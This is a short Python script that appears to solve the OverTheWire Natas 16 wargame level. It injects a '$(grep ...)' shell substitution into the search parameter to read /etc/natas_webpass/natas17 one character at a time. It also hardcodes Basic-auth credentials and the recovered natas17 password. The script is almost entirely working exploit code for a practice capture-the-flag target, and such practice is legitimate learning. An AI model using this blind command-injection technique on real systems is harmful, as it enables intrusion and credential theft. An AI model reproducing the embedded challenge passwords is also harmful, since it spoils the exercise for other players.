#!/usr/bin/env python3

import requests
import json
import re
import base64
import sys
import urllib
import urllib.parse

url = "http://natas16.natas.labs.overthewire.org/?needle=hello&submit=Search"
headers = {
"Authorization" : "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
}

standin = "Christians"
query_prefix = standin + "$(grep ^"
password = ""
query_suffix = " /etc/natas_webpass/natas17)"
legal_chars_string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
example_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

def tryletter(prefix, letter):
    query_url = "http://natas16.natas.labs.overthewire.org/?needle=" + urllib.parse.quote_plus(query_prefix + prefix + letter + query_suffix)
    response = requests.get(query_url, headers=headers)

    if re.search(standin, response.text):
        return False

    return True

def split(word):
    return [char for char in word]

legal_chars = split(legal_chars_string)
prefix = ""
while len(prefix) < len(example_password):
    for char in legal_chars:
        if tryletter(prefix, char):
            prefix += char
            break
    print("prefix: " + prefix)


# natas17 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
